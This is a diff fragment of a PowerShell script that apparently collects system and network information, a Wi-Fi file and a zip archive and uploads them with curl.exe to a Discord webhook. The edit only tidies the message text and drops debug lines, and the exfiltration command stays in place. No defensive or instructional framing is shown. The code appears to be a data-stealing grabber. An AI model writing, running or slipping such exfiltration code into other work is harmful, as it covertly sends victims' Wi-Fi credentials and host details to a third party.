@@ -34,18 +34,13 @@ $netInfoText = Get-NetAdapter | ForEach-Object {
 
 # Send to discord
 
-$content = "$($whoami_content)| \n $netInfoText | @everyone"
-
-Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt"
-
-Write-Output "about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt"
+$content = "Network summary:`n```$netInfoText```"
 
 curl.exe -X POST $wh `
-    -F "content=$content" `
-    -F "file1=@$zip" `
-    -F "file2=@$wifiFile" `
-    -F "file3=@$e\ipcfg.txt" `
-
+  -F "content=$content" `
+  -F "file1=@$zip" `
+  -F "file2=@$wifiFile" `
+  -F "file3=@$e\ipcfg.txt"
 
 # cleanup
 #cls
